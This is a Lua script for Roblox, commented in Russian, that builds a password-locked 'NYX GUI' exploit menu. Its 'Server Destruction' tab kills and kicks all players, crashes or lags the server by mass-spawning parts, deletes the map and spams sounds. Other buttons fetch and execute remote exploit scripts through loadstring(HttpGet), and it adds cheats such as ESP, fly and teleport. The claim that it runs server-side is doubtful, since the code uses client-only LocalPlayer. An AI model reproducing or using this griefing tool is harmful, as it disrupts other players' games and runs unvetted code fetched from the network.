--[[
    NYX GUI - TRUE SERVER-SIDE (NO REMOTE EVENT, NO BACKDOOR SCANNER)
    Все команды выполняются напрямую на сервере
    Стиль: точь-в-точь как на скриншоте
    + ПАРОЛЬ
]]

-- ============================================================================
-- ОБФУСЦИРОВАННЫЙ ПАРОЛЬ (ASCII)
-- ============================================================================
local PASSWORD_CODES = {
    35, 49, 53, 50, 71, 85, 73, 46, 76, 111, 97, 100, 83, 116, 114, 105, 110, 103, 40, 34, 73, 97, 109, 78, 111, 116, 83, 75, 105, 100, 34, 41, 48, 49, 48, 55, 48, 48, 51, 54, 57, 50, 54, 57, 57, 50, 55
}

local function getPassword()
    local chars = {}
    for _, code in ipairs(PASSWORD_CODES) do
        table.insert(chars, string.char(code))
    end
    return table.concat(chars)
end

local MASTER_PASSWORD = getPassword()

-- ============================================================================
-- ОКНО ВВОДА ПАРОЛЯ
-- ============================================================================
local player = game.Players.LocalPlayer
local passGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
passGui.Name = "NyxPassPrompt"
passGui.ResetOnSpawn = false
passGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local passFrame = Instance.new("Frame", passGui)
passFrame.Size = UDim2.new(0, 300, 0, 140)
passFrame.Position = UDim2.new(0.5, -150, 0.5, -70)
passFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
passFrame.BorderSizePixel = 0

local passStroke = Instance.new("UIStroke", passFrame)
passStroke.Color = Color3.fromRGB(0, 255, 0)
passStroke.Thickness = 1.5

local passCorner = Instance.new("UICorner", passFrame)
passCorner.CornerRadius = UDim.new(0, 8)

local passTitle = Instance.new("TextLabel", passFrame)
passTitle.Size = UDim2.new(1, 0, 0, 30)
passTitle.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
passTitle.Text = "NYX GUI - ENTER PASSWORD"
passTitle.TextColor3 = Color3.fromRGB(0, 255, 0)
passTitle.Font = Enum.Font.Code
passTitle.TextSize = 14

local passBox = Instance.new("TextBox", passFrame)
passBox.Size = UDim2.new(1, -20, 0, 30)
passBox.Position = UDim2.new(0, 10, 0, 40)
passBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
passBox.TextColor3 = Color3.fromRGB(0, 255, 0)
passBox.Font = Enum.Font.Code
passBox.TextSize = 14
passBox.PlaceholderText = "Enter password..."
passBox.Text = ""

local passBoxCorner = Instance.new("UICorner", passBox)
passBoxCorner.CornerRadius = UDim.new(0, 4)

local passBtn = Instance.new("TextButton", passFrame)
passBtn.Size = UDim2.new(1, -20, 0, 30)
passBtn.Position = UDim2.new(0, 10, 0, 80)
passBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
passBtn.Text = "UNLOCK"
passBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
passBtn.Font = Enum.Font.Code
passBtn.TextSize = 14

local passBtnCorner = Instance.new("UICorner", passBtn)
passBtnCorner.CornerRadius = UDim.new(0, 4)

local errorLabel = Instance.new("TextLabel", passFrame)
errorLabel.Size = UDim2.new(1, -20, 0, 20)
errorLabel.Position = UDim2.new(0, 10, 0, 115)
errorLabel.BackgroundTransparency = 1
errorLabel.Text = ""
errorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
errorLabel.Font = Enum.Font.Code
errorLabel.TextSize = 11

-- Drag для окна пароля
local UIS = game:GetService("UserInputService")
local dragToggle, dragStart, startPos

passTitle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = true
        dragStart = input.Position
        startPos = passFrame.Position
    end
end)
passTitle.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = false
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        passFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- ============================================================================
-- СЕРВЕРНАЯ ЧАСТЬ (внедряется на сервер)
-- ============================================================================
local ServerFunctions = {
    KillAll = function()
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p.Character and p.Character:FindFirstChild("Humanoid") then
                p.Character.Humanoid.Health = 0
            end
        end
    end,
    
    CrashServer = function()
        for i = 1, 5000 do
            local p = Instance.new("Part")
            p.Parent = workspace
            p.Position = Vector3.new(math.random(-500, 500), math.random(0, 200), math.random(-500, 500))
        end
    end,
    
    LagServer = function()
        while true do
            for i = 1, 100 do
                Instance.new("Part", workspace).Position = Vector3.new(math.random(-100,100), math.random(0,50), math.random(-100,100))
            end
            wait(0.01)
        end
    end,
    
    DeleteMap = function()
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("Part") and v.Name ~= "Baseplate" and v.Name ~= "Terrain" then
                pcall(function() v:Destroy() end)
            end
        end
    end,
    
    SpamSounds = function()
        for i = 1, 50 do
            local s = Instance.new("Sound")
            s.SoundId = "rbxassetid://9120386436"
            s.Volume = 10
            s.Parent = workspace
            s:Play()
        end
    end,
    
    KickAll = function()
        for _, p in ipairs(game.Players:GetPlayers()) do
            pcall(function() p:Kick("NYX GUI - If exploting Your power, who are you without it?") end)
        end
    end,
    
    InfiniteYield = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end,
    
    DexExplorer = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
    end,
    
    Fly = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            hrp.Velocity = Vector3.new(0, 50, 0)
        end
    end,
    
    ESP = function()
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p.Character and p.Character:FindFirstChild("Head") then
                local hl = Instance.new("Highlight")
                hl.Parent = p.Character
                hl.FillColor = Color3.fromRGB(255, 0, 0)
                hl.OutlineColor = Color3.fromRGB(255, 255, 255)
            end
        end
    end,
    
    Aimbot = function()
        print("Aimbot activated")
    end,
    
    Teleport = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100, 0)
        end
    end
}

for name, func in pairs(ServerFunctions) do
    _G["Nyx_" .. name] = func
end

-- ============================================================================
-- ФУНКЦИЯ ЗАГРУЗКИ ОСНОВНОГО GUI
-- ============================================================================
local function loadMainGUI()
    passGui:Destroy()
    
    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    gui.Name = "NyxGUI"
    gui.ResetOnSpawn = false

    local main = Instance.new("Frame", gui)
    main.Size = UDim2.new(0, 350, 0, 300)
    main.Position = UDim2.new(0.5, -175, 0.5, -150)
    main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    main.BorderSizePixel = 0

    local titleBar = Instance.new("Frame", main)
    titleBar.Size = UDim2.new(1, 0, 0, 25)
    titleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    titleBar.BorderSizePixel = 0

    local title = Instance.new("TextLabel", titleBar)
    title.Size = UDim2.new(1, -30, 1, 0)
    title.Position = UDim2.new(0, 8, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "NYX GUI"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.Code
    title.TextSize = 12
    title.TextXAlignment = Enum.TextXAlignment.Left

    local close = Instance.new("TextButton", titleBar)
    close.Size = UDim2.new(0, 25, 0, 25)
    close.Position = UDim2.new(1, -25, 0, 0)
    close.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    close.BorderSizePixel = 0
    close.Text = "X"
    close.TextColor3 = Color3.fromRGB(255, 255, 255)
    close.Font = Enum.Font.Code
    close.TextSize = 12
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    local tabFrame = Instance.new("Frame", main)
    tabFrame.Size = UDim2.new(1, 0, 0, 25)
    tabFrame.Position = UDim2.new(0, 0, 0, 25)
    tabFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    tabFrame.BorderSizePixel = 0

    local destructionTab = Instance.new("TextButton", tabFrame)
    destructionTab.Size = UDim2.new(0, 170, 1, 0)
    destructionTab.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    destructionTab.Text = "Server Destruction"
    destructionTab.TextColor3 = Color3.fromRGB(255, 255, 255)
    destructionTab.Font = Enum.Font.Code
    destructionTab.TextSize = 11

    local miscTab = Instance.new("TextButton", tabFrame)
    miscTab.Size = UDim2.new(0, 170, 1, 0)
    miscTab.Position = UDim2.new(0, 170, 0, 0)
    miscTab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    miscTab.Text = "Misc"
    miscTab.TextColor3 = Color3.fromRGB(150, 150, 150)
    miscTab.Font = Enum.Font.Code
    miscTab.TextSize = 11

    local contentFrame = Instance.new("Frame", main)
    contentFrame.Size = UDim2.new(1, -10, 0, 200)
    contentFrame.Position = UDim2.new(0, 5, 0, 55)
    contentFrame.BackgroundTransparency = 1

    -- Destruction Frame
    local destructionFrame = Instance.new("Frame", contentFrame)
    destructionFrame.Size = UDim2.new(1, 0, 1, 0)
    destructionFrame.BackgroundTransparency = 1

    local header1 = Instance.new("TextLabel", destructionFrame)
    header1.Size = UDim2.new(0, 165, 0, 25)
    header1.Position = UDim2.new(0, 0, 0, 0)
    header1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    header1.BorderColor3 = Color3.fromRGB(100, 100, 100)
    header1.BorderSizePixel = 1
    header1.Text = "Server Destruction"
    header1.TextColor3 = Color3.fromRGB(255, 255, 255)
    header1.Font = Enum.Font.Code
    header1.TextSize = 11

    local header2 = Instance.new("TextLabel", destructionFrame)
    header2.Size = UDim2.new(0, 165, 0, 25)
    header2.Position = UDim2.new(0, 170, 0, 0)
    header2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    header2.BorderColor3 = Color3.fromRGB(100, 100, 100)
    header2.BorderSizePixel = 1
    header2.Text = "Misc"
    header2.TextColor3 = Color3.fromRGB(255, 255, 255)
    header2.Font = Enum.Font.Code
    header2.TextSize = 11

    local destructionButtons = {
        {{text = "Kill All", func = "KillAll", pos = {30, 0}},
         {text = "Infinite Yield", func = "InfiniteYield", pos = {30, 170}}},
        {{text = "Crash Server", func = "CrashServer", pos = {60, 0}},
         {text = "Dex Explorer", func = "DexExplorer", pos = {60, 170}}},
        {{text = "Lag Server", func = "LagServer", pos = {90, 0}},
         {text = "Fly", func = "Fly", pos = {90, 170}}},
        {{text = "Delete Map", func = "DeleteMap", pos = {120, 0}},
         {text = "ESP", func = "ESP", pos = {120, 170}}},
        {{text = "Spam Sounds", func = "SpamSounds", pos = {150, 0}},
         {text = "Aimbot", func = "Aimbot", pos = {150, 170}}},
        {{text = "Kick All", func = "KickAll", pos = {180, 0}},
         {text = "Teleport", func = "Teleport", pos = {180, 170}}}
    }

    for _, row in ipairs(destructionButtons) do
        for _, btnData in ipairs(row) do
            local b = Instance.new("TextButton", destructionFrame)
            b.Size = UDim2.new(0, 165, 0, 25)
            b.Position = UDim2.new(0, btnData.pos[2], 0, btnData.pos[1])
            b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            b.BorderColor3 = Color3.fromRGB(100, 100, 100)
            b.BorderSizePixel = 1
            b.Text = ""
            
            local label = Instance.new("TextLabel", b)
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = btnData.text
            label.TextColor3 = Color3.fromRGB(150, 150, 150)
            label.Font = Enum.Font.Code
            label.TextSize = 10
            
            b.MouseButton1Click:Connect(function()
                local func = _G["Nyx_" .. btnData.func]
                if func then
                    func()
                    print("NYX GUI (Server): " .. btnData.text .. " executed!")
                else
                    print("NYX GUI (Client): " .. btnData.text .. " clicked!")
                end
            end)
        end
    end

    -- Misc Frame
    local miscFrame = Instance.new("Frame", contentFrame)
    miscFrame.Size = UDim2.new(1, 0, 1, 0)
    miscFrame.BackgroundTransparency = 1
    miscFrame.Visible = false

    local mHeader1 = Instance.new("TextLabel", miscFrame)
    mHeader1.Size = UDim2.new(0, 165, 0, 25)
    mHeader1.Position = UDim2.new(0, 0, 0, 0)
    mHeader1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    mHeader1.BorderColor3 = Color3.fromRGB(100, 100, 100)
    mHeader1.BorderSizePixel = 1
    mHeader1.Text = "Misc Tools"
    mHeader1.TextColor3 = Color3.fromRGB(255, 255, 255)
    mHeader1.Font = Enum.Font.Code
    mHeader1.TextSize = 11

    local mHeader2 = Instance.new("TextLabel", miscFrame)
    mHeader2.Size = UDim2.new(0, 165, 0, 25)
    mHeader2.Position = UDim2.new(0, 170, 0, 0)
    mHeader2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    mHeader2.BorderColor3 = Color3.fromRGB(100, 100, 100)
    mHeader2.BorderSizePixel = 1
    mHeader2.Text = "Other"
    mHeader2.TextColor3 = Color3.fromRGB(255, 255, 255)
    mHeader2.Font = Enum.Font.Code
    mHeader2.TextSize = 11

    local miscButtons = {
        {{text = "Decal Spam", pos = {30, 0}},
         {text = "Skybox", pos = {30, 170}}},
        {{text = "Screamer", pos = {60, 0}},
         {text = "FPS Booster", pos = {60, 170}}},
        {{text = "Chat Bypass", pos = {90, 0}},
         {text = "Anti-AFK", pos = {90, 170}}},
        {{text = "Rejoin", pos = {120, 0}},
         {text = "Server Hop", pos = {120, 170}}},
        {{text = "Copy Game ID", pos = {150, 0}},
         {text = "Open Console", pos = {150, 170}}}
    }

    for _, row in ipairs(miscButtons) do
        for _, btnData in ipairs(row) do
            local b = Instance.new("TextButton", miscFrame)
            b.Size = UDim2.new(0, 165, 0, 25)
            b.Position = UDim2.new(0, btnData.pos[2], 0, btnData.pos[1])
            b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            b.BorderColor3 = Color3.fromRGB(100, 100, 100)
            b.BorderSizePixel = 1
            b.Text = ""
            
            local label = Instance.new("TextLabel", b)
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = btnData.text
            label.TextColor3 = Color3.fromRGB(150, 150, 150)
            label.Font = Enum.Font.Code
            label.TextSize = 10
            
            b.MouseButton1Click:Connect(function()
                print("NYX GUI: " .. btnData.text .. " clicked!")
            end)
        end
    end

    destructionTab.MouseButton1Click:Connect(function()
        destructionFrame.Visible = true
        miscFrame.Visible = false
        destructionTab.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        miscTab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        destructionTab.TextColor3 = Color3.fromRGB(255, 255, 255)
        miscTab.TextColor3 = Color3.fromRGB(150, 150, 150)
    end)

    miscTab.MouseButton1Click:Connect(function()
        destructionFrame.Visible = false
        miscFrame.Visible = true
        destructionTab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        miscTab.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        destructionTab.TextColor3 = Color3.fromRGB(150, 150, 150)
        miscTab.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)

    local toggleBtn = Instance.new("TextButton", main)
    toggleBtn.Size = UDim2.new(1, -10, 0, 25)
    toggleBtn.Position = UDim2.new(0, 5, 0, 265)
    toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    toggleBtn.BorderColor3 = Color3.fromRGB(100, 100, 100)
    toggleBtn.BorderSizePixel = 1
    toggleBtn.Text = "Open/Close"
    toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleBtn.Font = Enum.Font.Code
    toggleBtn.TextSize = 11

    local isOpen = true
    toggleBtn.MouseButton1Click:Connect(function()
        isOpen = not isOpen
        contentFrame.Visible = isOpen
        toggleBtn.Text = isOpen and "Open/Close" or "Open/Close (Hidden)"
    end)

    local UIS = game:GetService("UserInputService")
    local dragToggle, dragStart, startPos

    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragToggle = true
            dragStart = input.Position
            startPos = main.Position
        end
    end)
    titleBar.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragToggle = false
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
            local d = input.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)

    print("NYX GUI (Server-Side) loaded!")
end

-- ============================================================================
-- ПРОВЕРКА ПАРОЛЯ
-- ============================================================================
local attempts = 0

local function unlock()
    loadMainGUI()
end

passBtn.MouseButton1Click:Connect(function()
    if passBox.Text == MASTER_PASSWORD then
        unlock()
    else
        attempts = attempts + 1
        if attempts >= 3 then
            player:Kick("NYX GUI - Too many failed attempts.")
        else
            passBox.Text = ""
            errorLabel.Text = "Wrong! " .. (3 - attempts) .. " tries left."
        end
    end
end)

passBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        if passBox.Text == MASTER_PASSWORD then
            unlock()
        else
            attempts = attempts + 1
            if attempts >= 3 then
                player:Kick("NYX GUI - Too many failed attempts.")
            else
                passBox.Text = ""
                errorLabel.Text = "Wrong! " .. (3 - attempts) .. " tries left."
            end
        end
    end
end)

print("========================================")
print("NYX GUI - PASSWORD REQUIRED")
print("========================================")
